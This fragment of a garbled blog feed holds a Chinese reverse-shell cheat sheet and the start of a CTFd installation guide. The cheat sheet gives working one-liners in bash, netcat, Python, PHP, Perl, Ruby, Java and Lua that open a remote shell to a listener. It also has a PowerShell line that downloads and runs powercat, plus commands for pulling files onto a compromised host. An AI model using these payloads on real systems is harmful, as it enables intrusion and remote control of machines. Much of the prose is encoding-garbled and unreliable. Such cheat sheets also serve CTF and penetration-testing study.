        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†shellå’Œåå¼¹shellçš„ä¸€äº›å¸¸è§æ–¹æ³•ä»¥åŠå¦‚ä½•åœ¨shellä¸‹è½½æ–‡ä»¶ï¼</p><a id="more"></a><h2 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h2><p>ä»€ä¹ˆæ˜¯åå¼¹shellï¼Ÿ</p><p>åå¼¹shellï¼Œå³reverse shellï¼Œä¸€èˆ¬æƒ…å†µä¸‹æŒ‡åœ¨æœ¬åœ°çš„å‘½ä»¤è¡Œçš„è¾“å…¥è¾“å‡ºè½¬åˆ°æ§åˆ¶ç«¯å¾—ä»¥æ‰§è¡Œã€‚</p><h3 id="æ­£å‘è¿æ¥"><a href="#æ­£å‘è¿æ¥" class="headerlink" title="æ­£å‘è¿æ¥"></a>æ­£å‘è¿æ¥</h3><p>å‡è®¾æˆ‘ä»¬æ”»å‡»äº†ä¸€å°æœºå™¨ï¼Œæ‰“å¼€äº†è¯¥æœºå™¨çš„ä¸€ä¸ªç«¯å£ï¼Œæ”»å‡»è€…åœ¨è‡ªå·±çš„æœºå™¨å»è¿æ¥ç›®æ ‡æœºå™¨ï¼ˆç›®æ ‡ipï¼šç›®æ ‡æœºå™¨ç«¯å£ï¼‰ï¼Œè¿™æ˜¯æ¯”è¾ƒå¸¸è§„çš„å½¢å¼ï¼Œæˆ‘ä»¬å«åšæ­£å‘è¿æ¥ã€‚è¿œç¨‹æ¡Œé¢ï¼ŒwebæœåŠ¡ï¼Œsshï¼Œtelnetç­‰ç­‰ï¼Œéƒ½æ˜¯æ­£å‘è¿æ¥ã€‚</p><p>ä½†è¿™ç§æœ‰å±€é™æ€§ï¼š</p><ol><li><p>å¦‚æœè¢«æ§ç«¯å†å†…ç½‘ä¸­ï¼Œä¸èƒ½ç›´æ¥è¿æ¥</p></li><li><p>é˜²ç«å¢™çš„é™åˆ¶</p></li></ol><h3 id="åå¼¹shell-1"><a href="#åå¼¹shell-1" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h3><p>å°±æ˜¯æ§åˆ¶ç«¯ç›‘å¬åœ¨æŸTCP/UDPç«¯å£ï¼Œè¢«æ§åˆ¶ç«¯ä¸»åŠ¨è¿æ¥æ§åˆ¶ç«¯çš„è¿™ä¸€ç«¯å£ï¼Œæ§åˆ¶ç«¯å¯ä»¥é€šè¿‡è¿™ä¸€ç«¯å£è¿›è¡Œç›¸å…³å‘½ä»¤æ“ä½œã€‚</p><p>åå‘shellé€šå¸¸ç”¨äºè¢«æ§ç«¯å› é˜²ç«å¢™å—é™ã€æƒé™ä¸è¶³ã€ç«¯å£è¢«å ç”¨ç­‰æƒ…å½¢ï¼ŒåŒæ—¶ä¹Ÿå®ç°äº†è¢«æ§ç«¯çš„ç²¾å‡†æ§åˆ¶ï¼ˆæŒ‡å®šäº†è¢«æ§åˆ¶ç«¯çš„IPï¼Œé™¤æ­¤ä¹‹å¤–çš„æ˜¯æ— æ³•å’Œè¢«æ§ç«¯æ— æ³•è¿æ¥ï¼‰ã€‚</p><p>ä¸‹é¢çš„ä¾‹å­ä¸»è¦æ˜¯åå‘åå¼¹shellï¼Œä»¥ä¸‹çš„æœ‰äº›æ–¹æ³•å¯å°†<code>/bin/bash</code>æ›¿æ¢æˆ<code>cmd.exe</code>ç”¨äºwindowsåå¼¹shell</p><h2 id="åå¼¹shell-2"><a href="#åå¼¹shell-2" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h2><h3 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;x.x.x.x&#x2F;port 0&gt;&amp;1</span><br></pre></td></tr></table></figure><ol><li><p><code>bash -i</code>   æ‰“å¼€ä¸€ä¸ªäº¤äº’çš„bash</p></li><li><p><code>&gt;&amp;</code>   å°†æ ‡å‡†é”™è¯¯è¾“å‡ºé‡å®šå‘åˆ°æ ‡å‡†è¾“å‡º</p></li><li><p><code>/dev/tcp/x.x.x.x/port</code>   æ„ä¸ºè°ƒç”¨socket,å»ºç«‹socketè¿æ¥,å…¶ä¸­x.x.x.xä¸ºè¦åå¼¹åˆ°çš„ä¸»æœºipï¼Œportä¸ºç«¯å£</p></li><li><p><code>0&gt;&amp;1</code>   æ ‡å‡†è¾“å…¥é‡å®šå‘åˆ°æ ‡å‡†è¾“å‡ºï¼Œå®ç°ä½ ä¸åå¼¹å‡ºæ¥çš„shellçš„äº¤äº’</p></li></ol><p>æ³¨ï¼š<code>/dev/tcp/</code> æ˜¯Linuxä¸­çš„ä¸€ä¸ªç‰¹æ®Šè®¾å¤‡,æ‰“å¼€è¿™ä¸ªæ–‡ä»¶å°±ç›¸å½“äºå‘å‡ºäº†ä¸€ä¸ªsocketè°ƒç”¨ï¼Œå»ºç«‹ä¸€ä¸ªsocketè¿æ¥ï¼Œè¯»å†™è¿™ä¸ªæ–‡ä»¶å°±ç›¸å½“äºåœ¨è¿™ä¸ªsocketè¿æ¥ä¸­ä¼ è¾“æ•°æ®ã€‚åŒç†ï¼ŒLinuxä¸­è¿˜å­˜åœ¨<code>/dev/udp/</code>ã€‚</p><h3 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h3><p>Linuxä¸­ncå‘½ä»¤æ˜¯ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§çš„ç½‘ç»œå·¥å…·ï¼Œå…¨ç§°æ˜¯netcat</p><p>é€‰é¡¹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">-g&lt;ç½‘å…³&gt;ï¼šè®¾ç½®è·¯ç”±å™¨è·ƒç¨‹é€šä¿¡ç½‘å…³ï¼Œæœ€å¤šè®¾ç½®8ä¸ªï¼›</span><br><span class="line">-G&lt;æŒ‡å‘å™¨æ•°ç›®&gt;ï¼šè®¾ç½®æ¥æºè·¯ç”±æŒ‡å‘å™¨ï¼Œå…¶æ•°å€¼ä¸º4çš„å€æ•°ï¼›</span><br><span class="line">-hï¼šåœ¨çº¿å¸®åŠ©ï¼›</span><br><span class="line">-i&lt;å»¶è¿Ÿç§’æ•°&gt;ï¼šè®¾ç½®æ—¶é—´é—´éš”ï¼Œä»¥ä¾¿ä¼ é€ä¿¡æ¯åŠæ‰«æé€šä¿¡ç«¯å£ï¼›</span><br><span class="line">-lï¼šä½¿ç”¨ç›‘å¬æ¨¡å¼ï¼Œç›‘æ§ä¼ å…¥çš„èµ„æ–™ï¼›</span><br><span class="line">-nï¼šç›´æ¥ä½¿ç”¨ipåœ°å€ï¼Œè€Œä¸é€šè¿‡åŸŸåæœåŠ¡å™¨ï¼›</span><br><span class="line">-o&lt;è¾“å‡ºæ–‡ä»¶&gt;ï¼šæŒ‡å®šæ–‡ä»¶åç§°ï¼ŒæŠŠå¾€æ¥ä¼ è¾“çš„æ•°æ®ä»¥16è¿›åˆ¶å­—ç å€¾å€’æˆè¯¥æ–‡ä»¶ä¿å­˜ï¼›</span><br><span class="line">-p&lt;é€šä¿¡ç«¯å£&gt;ï¼šè®¾ç½®æœ¬åœ°ä¸»æœºä½¿ç”¨çš„é€šä¿¡ç«¯å£ï¼›</span><br><span class="line">-rï¼šæŒ‡å®šæºç«¯å£å’Œç›®çš„ç«¯å£éƒ½è¿›è¡Œéšæœºçš„é€‰æ‹©ï¼›</span><br><span class="line">-s&lt;æ¥æºä½å€&gt;ï¼šè®¾ç½®æœ¬åœ°ä¸»æœºé€å‡ºæ•°æ®åŒ…çš„IPåœ°å€ï¼›</span><br><span class="line">-uï¼šä½¿ç”¨UDPä¼ è¾“åè®®ï¼›</span><br><span class="line">-vï¼šæ˜¾ç¤ºæŒ‡ä»¤æ‰§è¡Œè¿‡ç¨‹ï¼›</span><br><span class="line">-w&lt;è¶…æ—¶ç§’æ•°&gt;ï¼šè®¾ç½®ç­‰å¾…è¿çº¿çš„æ—¶é—´ï¼›</span><br><span class="line">-zï¼šä½¿ç”¨0è¾“å…¥&#x2F;è¾“å‡ºæ¨¡å¼ï¼Œåªåœ¨æ‰«æé€šä¿¡ç«¯å£æ—¶ä½¿ç”¨</span><br></pre></td></tr></table></figure><p>å¸¸ç”¨çš„å‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">è¢«æ§ç«¯ï¼šnc 192.168.31.174 8080 -t -e &#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line">é€šè¿‡webshellæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ncå‘½ä»¤ç›´æ¥å»ºç«‹ä¸€ä¸ªtcp 8080 çš„ä¼šè¯è¿æ¥ï¼Œç„¶åå°†æœ¬åœ°çš„bashé€šè¿‡è¿™ä¸ªä¼šè¯è¿æ¥åå¼¹ç»™ç›®æ ‡ä¸»æœºï¼ˆ192.168.31.174ï¼‰</span><br><span class="line"></span><br><span class="line">æ§åˆ¶ç«¯ï¼šnc -lvp 8080</span><br><span class="line"></span><br><span class="line">ä½¿ç”¨ç›‘å¬æ¨¡å¼ç›‘å¬8080ç«¯å£ï¼Œå¹¶æ˜¾ç¤ºå‘½ä»¤æ‰§è¡Œè¿‡ç¨‹</span><br></pre></td></tr></table></figure><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;</span><br></pre></td></tr></table></figure><p>å¦‚æœç›®æ ‡æœºå™¨ä¸Šæœ‰ptyæ¨¡å—ï¼Œå¯ä»¥ç›´æ¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;</span><br></pre></td></tr></table></figure><h3 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;besimorhino&#x2F;powercat&#x2F;master&#x2F;powercat.ps1&#39;);powercat -c 192.168.159.134 -p 6666 -e cmd</span><br></pre></td></tr></table></figure><p>ç”¨äºwindowsçš„åå¼¹shell</p><h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#39;$sock&#x3D;fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br></pre></td></tr></table></figure><h3 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h3><p>æ–¹æ³•1ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &#39;use Socket;$i&#x3D;&quot;10.0.0.1&quot;;$p&#x3D;1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39;</span><br></pre></td></tr></table></figure><p>æ–¹æ³•2ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -MIO -e &#39;$p&#x3D;fork;exit,if($p);$c&#x3D;new IO::Socket::INET(PeerAddr,&quot;x.x.x.x:5555&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</span><br></pre></td></tr></table></figure><h3 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h3><p>æ–¹æ³•1ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e &#39;exit if fork;c&#x3D;TCPSocket.new(&quot;x.x.x.x&quot;,&quot;5555&quot;);while(cmd&#x3D;c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#39;</span><br></pre></td></tr></table></figure><p>æ–¹æ³•2ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e&#39;f&#x3D;TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;</span><br></pre></td></tr></table></figure><h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public class Revs &#123;</span><br><span class="line">    &#x2F;**</span><br><span class="line">    * @param args</span><br><span class="line">    * @throws Exception </span><br><span class="line">    *&#x2F;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        &#x2F;&#x2F; TODO Auto-generated method stub</span><br><span class="line">        Runtime r &#x3D; Runtime.getRuntime();</span><br><span class="line">        String cmd[]&#x3D; &#123;&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;x.x.x.x&#x2F;5555;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;&#125;;</span><br><span class="line">        Process p &#x3D; r.exec(cmd);</span><br><span class="line">        p.waitFor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Lua"><a href="#Lua" class="headerlink" title="Lua"></a>Lua</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lua -e &quot;require(&#39;socket&#39;);require(&#39;os&#39;);t&#x3D;socket.tcp();t:connect(&#39;x.x.x.x&#39;,&#39;5555&#39;);os.execute(&#39;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&quot;</span><br></pre></td></tr></table></figure><h2 id="shellä¸‹è½½æ–‡ä»¶"><a href="#shellä¸‹è½½æ–‡ä»¶" class="headerlink" title="shellä¸‹è½½æ–‡ä»¶"></a>shellä¸‹è½½æ–‡ä»¶</h2><p>å…ˆæŠŠæ–‡ä»¶æ”¾åˆ°æœ‰å…¬ç½‘çš„æœåŠ¡å™¨ä¸Š</p><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><p>æ–¹æ³•1(powershell):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell (new-object System.Net.WebClient).DownloadFile( &#39;http:&#x2F;&#x2F;****&#x2F;***&#39;,&#39;C:&#x2F;Users&#x2F;Public&#x2F;a.exe&#39;)</span><br></pre></td></tr></table></figure><p>æ–¹æ³•2(certutil)ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http:&#x2F;&#x2F;***&#x2F;a.exe C:&#x2F;Users&#x2F;a.exe</span><br></pre></td></tr></table></figure><p>æ–¹æ³•3(bitsadmin):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin &#x2F;transfer n http:&#x2F;&#x2F;download.fb.com&#x2F;file&#x2F;xx.zip c:\pentest\xx.zip</span><br></pre></td></tr></table></figure><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p>æ–¹æ³•1(curl):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -O http:&#x2F;&#x2F;****&#x2F;a.exe</span><br></pre></td></tr></table></figure><p>æ–¹æ³•2(nc):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; åœ¨ 45.77.17.128 è¿™å°ä¸»æœºç›‘å¬ 9988 ç«¯å£ï¼ˆæ³¨æ„ç¬¦å·æ˜¯ &quot;&lt;&quot; ï¼‰</span><br><span class="line"># nc -l 9988 &lt; Python-3.6.6.tar.xz</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; åœ¨ 192.168.1.254 è¿™å°ä¸»æœºä¸‹è½½æ–‡ä»¶ï¼ˆæ³¨æ„ç¬¦å·æ˜¯ &quot;&gt;&quot; ï¼‰</span><br><span class="line"># nc --recv-only 45.77.17.128 9988 &gt; Python-3.6.6.tar.xz</span><br><span class="line"></span><br><span class="line">æˆ–è€…</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; åœ¨ 45.77.17.128 è¿™å°ä¸»æœºç›‘å¬ 9988 ç«¯å£ï¼ˆæ³¨æ„ç¬¦å·æ˜¯ &quot;&gt;&quot; ï¼‰</span><br><span class="line"># nc -l 9988 &gt; command.tar.gz</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; åœ¨ 192.168.1.254 è¿™å°ä¸»æœºä¸Šä¼ æ–‡ä»¶ï¼ˆæ³¨æ„ç¬¦å·æ˜¯ &quot;&lt;&quot; ï¼‰</span><br><span class="line"># nc --send-only 45.77.17.128 9988 &lt; command.tar.gz</span><br></pre></td></tr></table></figure><p>æ–¹æ³•3(wegt):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wegt http:&#x2F;&#x2F;****&#x2F;a.sh</span><br></pre></td></tr></table></figure><p>å‚è€ƒï¼š</p><p><a href="http://www.gtfly.top/2019/05/09/%E5%8F%8D%E5%BC%B9shell.html">http://www.gtfly.top/2019/05/09/åå¼¹shell.html</a></p><p><a href="https://brucetg.github.io/2018/05/03/%E5%A4%9A%E7%A7%8D%E5%A7%BF%E5%8A%BF%E5%8F%8D%E5%BC%B9shell/">https://brucetg.github.io/2018/05/03/å¤šç§å§¿åŠ¿åå¼¹shell/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu16.04 CTFdå¹³å°æ­å»º</title>
      <link href="2019/11/13/ctfd-build/"/>
      <url>2019/11/13/ctfd-build/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†å¦‚ä½•åœ¨ubuntu16.04ç”¨dockeræ­å»ºå¹³å°ï¼Œä»¥åŠéƒ¨ç½²é¢˜ç›®ç­‰ç­‰ï¼</p><a id="more"></a><h2 id="å®‰è£…ç¯å¢ƒ"><a href="#å®‰è£…ç¯å¢ƒ" class="headerlink" title="å®‰è£…ç¯å¢ƒ"></a>å®‰è£…ç¯å¢ƒ</h2><p>å®‰è£…å‰å…ˆè¯´ä¸€ä¸‹æˆ‘çš„ç¯å¢ƒï¼Œé˜¿é‡Œäº‘å­¦ç”Ÿæœº</p><p><strong>å®‰è£…git</strong>(æœ‰çš„è¯å¿½ç•¥ï¼‰</p><pre><code>sudo apt-get updatesudo apt-get install git</code></pre><p><strong>å®‰è£…docker</strong></p><p>å¸è½½æ—§ç‰ˆæœ¬çš„docker</p><pre><code>sudo apt-get remove docker docker-engine docker.io containerd runc</code></pre><p>å®‰è£…ä»¥ä¸‹åŒ…ä»¥ä½¿aptå¯ä»¥é€šè¿‡HTTPSä½¿ç”¨å­˜å‚¨åº“ï¼ˆrepositoryï¼‰</p><pre><code>sudo apt-get install -y apt-transport-https ca-certificates curl software-properties-common</code></pre><p>æ·»åŠ Dockerå®˜æ–¹çš„GPGå¯†é’¥</p><pre><code>curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</code></pre><p>ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤æ¥è®¾ç½®stableå®˜æ–¹å­˜å‚¨åº“</p><pre><code>sudo add-apt-repository &quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable&quot;</code></pre><p>æˆ–è€…ä½¿ç”¨é˜¿é‡Œäº‘é•œåƒï¼Œä½¿ç”¨ä¸‹é¢ï¼ˆæ¨èä½¿ç”¨ï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg | sudo apt-key add -</span><br><span class="line">sudo add-apt-repository \</span><br><span class="line"><span class="string">&quot;deb [arch=amd64] https://mirrors.aliyun.com/docker-ce/linux/ubuntu \</span></span><br><span class="line"><span class="string"><span class="subst">$(lsb_release -cs)</span> \</span></span><br><span class="line"><span class="string">stable&quot;</span></span><br></pre></td></tr></table></figure><p>å†æ›´æ–°ä¸€ä¸‹aptåŒ…ç´¢å¼•</p><pre><code>sudo apt-get update</code></pre><p>å®‰è£…dockerce</p><pre><code>sudo apt-get install docker-ce docker-ce-cli containerd.io</code></pre><p>æŸ¥çœ‹æ˜¯å¦å®‰è£…æˆåŠŸ</p><pre><code>docker version</code></pre><p><img src="/2019/11/13/ctfd-build/20191113195206.png"></p><p>æŸ¥çœ‹dockeræœåŠ¡æ˜¯å¦å¯åŠ¨</p><pre><code>systemctl status docker</code></pre><p>è‹¥æœªå¯åŠ¨ï¼Œåˆ™å¯åŠ¨dockeræœåŠ¡</p><pre><code>sudo systemctl start docker</code></pre><p>è¯•ç€è¿è¡Œ</p><pre><code>sudo docker run hello-world</code></pre><p><strong>å®‰è£…docker-compose</strong></p><pre><code>sudo apt-get install docker-compose</code></pre><p>æ£€æŸ¥æ˜¯å¦å®‰è£…æˆåŠŸ</p><pre><code>docker-compose version</code></pre><p><strong>å®‰è£…CTFd</strong></p><p>å…‹éš†åº“</p><pre><code>git clone https://github.com/CTFd/CTFd.gitcd CTFd/</code></pre><p>å®‰è£…æ“ä½œç³»ç»Ÿéœ€è¦å®‰è£…çš„åŒ…</p><pre><code>./prepare.sh</code></pre><p>å®‰è£…pythonéœ€è¦çš„åŒ…</p><pre><code>pip install -r requirements.txt</code></pre><p>è¿è¡ŒCTFd</p><pre><code>python serve.py</code></pre><p>å¯ä»¥æµ‹è¯•ä»¥ä¸‹æ˜¯å¦æˆåŠŸ</p><pre><code>curl 127.0.0.1:4000</code></pre><p>å®Œæˆä»¥ä¸Šæ­¥éª¤åªæ˜¯åœ¨æœ¬åœ°æ­èµ·æœåŠ¡å™¨ï¼Œè¦æ˜¯æƒ³åœ¨å…¬ç½‘ï¼ˆç‰©ç†æœºï¼‰è®¿é—®ï¼Œè¿˜éœ€è¦å®‰è£…gunicorn</p><h2 id="gunicornéƒ¨ç½²CTFd"><a href="#gunicornéƒ¨ç½²CTFd" class="headerlink" title="gunicornéƒ¨ç½²CTFd"></a>gunicornéƒ¨ç½²CTFd</h2><p>å®‰è£…</p><pre><code>pip install gunicorn</code></pre><p>å¯åŠ¨æœåŠ¡ï¼Œåœ¨å…‹éš†çš„CTFdæ–‡ä»¶å¤¹</p><pre><code>gunicorn --bind 0.0.0.0:4000 -w 5 &quot;CTFd:create_app()&quot;(gunicorn --bind 0.0.0.0:8000 -w 5 &quot;CTFd:create_app()&quot;&amp;)// è¿™é‡ŒåŠ äº†()è¿˜æœ‰&amp;æ˜¯ä¸ºäº†é‚£èƒ½å¤Ÿåå°è¿è¡Œ</code></pre><p>è¡¨ç¤ºç»‘å®šç«¯å£å·4000,æœ‰5ä¸ªè¿›ç¨‹æ¥å¤„ç†è¯·æ±‚</p><p>ä½¿ç”¨gunicornå¯åŠ¨æœåŠ¡ï¼Œè®¿é—®æœ¬æœºip+ç«¯å£å³å¯ï¼Œå…¬ç½‘è®¿é—®å“åº”å¾ˆæ…¢</p><p><strong>æ³¨æ„ï¼š</strong></p><ol><li>é˜¿é‡Œäº‘å®‰å…¨ç»„é»˜è®¤ä¸å¼€æ”¾4000ç«¯å£ï¼Œéœ€è¦åœ¨å®‰å…¨ç»„è®¾ç½®</li><li>ç”¨å®å¡”çš„è¯ï¼Œå®‰å…¨-&gt;é˜²ç«å¢™é‡Œéœ€è¦æ”¾è¡Œç«¯å£ï¼ˆå‘äº†æˆ‘å¾ˆä¹…ï¼‰</li></ol><p><strong>é…ç½®mysql</strong></p><p>è¿™ä¸ªæˆ‘æ²¡è¯•è¿‡ï¼Œå¯ä»¥å‚è§è¿™ä¸ª<a href="https://blog.csdn.net/z1592570975/article/details/82912801">https://blog.csdn.net/z1592570975/article/details/82912801</a></p><h2 id="dockeréƒ¨ç½²CTFd"><a href="#dockeréƒ¨ç½²CTFd" class="headerlink" title="dockeréƒ¨ç½²CTFd"></a>dockeréƒ¨ç½²CTFd</h2><p>è¿˜æœ‰ç§æ–¹å¼å°±æ˜¯æŠŠCTFdç›´æ¥æ”¾dockeré‡Œï¼Œæ— éœ€è‹¦æ¼ç¯å¢ƒé—®é¢˜,ç›´æ¥pullå®˜æ–¹æä¾›çš„ä¾èµ–ç¯å¢ƒ,æ­å»ºåçš„è®¿é—®é€Ÿåº¦æ˜æ˜¾æå‡</p><p>åœ¨CTFdæ–‡ä»¶å¤¹é‡Œ</p><pre><code>docker-compose up -d</code></pre><p>å¦‚æœå‡ºç°ä»¥ä¸‹é”™è¯¯ï¼Œå¯èƒ½æ˜¯docker-composeç‰ˆæœ¬é—®é¢˜ï¼Œå› ä¸ºä¹‹å‰ç”¨apt-getå®‰è£…çš„ï¼Œå¯èƒ½ç‰ˆæœ¬æœ‰ç‚¹è€</p><p><img src="/2019/11/13/ctfd-build/20191114175009.png"></p><p>å‡ºç°è¿™ä¸ªé—®é¢˜å‘ç°ç”¨</p><pre><code>pip uninstall texttable</code></pre><p>å¸è½½ä¸äº†ï¼Œé‚£å°±</p><pre><code>cd /usr/lib/python(ä½ çš„ç‰ˆæœ¬å·)/dist-packages/rm -rf texttable-*.egg-info</code></pre><p>ç„¶åå†é‡æ–°</p><pre><code>pip install docker-compose</code></pre><p>å‘ç°å¯ä»¥å®‰è£…æˆåŠŸï¼Œç„¶å</p><pre><code>cd /CTFddocker-compose up -d</code></pre><p>è¿™ä¸ªè¿‡ç¨‹å¯èƒ½æœ‰ç‚¹æ¼«é•¿ï¼Œè€å¿ƒç­‰å¾…å°±å¥½</p><h2 id="ä¼˜åŒ–é…ç½®"><a href="#ä¼˜åŒ–é…ç½®" class="headerlink" title="ä¼˜åŒ–é…ç½®"></a>ä¼˜åŒ–é…ç½®</h2><h3 id="CTFdæ±‰åŒ–"><a href="#CTFdæ±‰åŒ–" class="headerlink" title="CTFdæ±‰åŒ–"></a>CTFdæ±‰åŒ–</h3><p><strong>æ±‰åŒ–</strong></p><p>ä¸‹è½½<a href="http://test.moonback.xyz/themes.zip">ä¸»é¢˜æ±‰åŒ–åŒ…</a></p><p>å°†<code>CTFd/CTFd/themes</code>æ–‡ä»¶å¤¹æ›¿æ¢å³å¯</p><h3 id="dockeré•œåƒæ¢æº"><a href="#dockeré•œåƒæ¢æº" class="headerlink" title="dockeré•œåƒæ¢æº"></a>dockeré•œåƒæ¢æº</h3><p>dockeré»˜è®¤æºä¸ºå›½å¤–å®˜æ–¹çš„ï¼Œä¸‹è½½é€Ÿåº¦è¾ƒæ…¢ï¼›æ›´æ¢æºï¼š</p><p>ä¿®æ”¹æˆ–æ–°å¢<code>/etc/docker/daemon.json</code>ï¼š</p><pre><code>vi /etc/docker/daemon.json</code></pre><p>å†™å…¥ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 